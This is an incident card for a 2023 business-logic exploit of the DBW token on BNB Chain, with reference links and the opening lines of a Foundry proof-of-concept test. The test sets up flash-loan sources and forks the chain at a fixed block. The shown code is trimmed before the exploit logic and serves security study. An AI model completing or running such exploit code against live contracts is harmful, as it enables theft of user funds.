# [?] - DBW - Business Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DBW
Published: 2023-03-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/DBW_exp.sol
Type: defi-exploit-poc

## Details
Lost: $24k
References:
- https://twitter.com/BeosinAlert/status/1639655134232969216
- https://twitter.com/AnciliaInc/status/1639289686937210880
- https://bscscan.com/tx/0x3b472f87431a52082bae7d8524b4e0af3cf930a105646259e1249f2218525607
- https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20230103---gds---business-logic-flaw

```solidity
contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo1 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address dodo3 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    address dodo4 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    Uni_Pair_V2 flashSwapPair = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);
    uint256 dodo1FlashLoanAmount;
    uint256 dodo2FlashLoanAmount;
    uint256 dodo3FlashLoanAmount;
    uint256 dodo4FlashLoanAmount;
    uint256 PairFlashLoanAmount;
    claimRewardImpl RewardImpl;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_745_691);
        cheats.label(address(USDT), "USDT");
        cheats.label(address(DBW), "DBW");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
        cheats.label(address(dodo1), "dodo1");
        cheats.label(address(dodo2), "dodo2");
        cheats.label(address(dodo3), "dodo3");
        cheats.label(address(dodo4), "dodo4");
        cheats.label(address(flashSwapPair), "flashSwapPair");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/DBW_exp.sol_
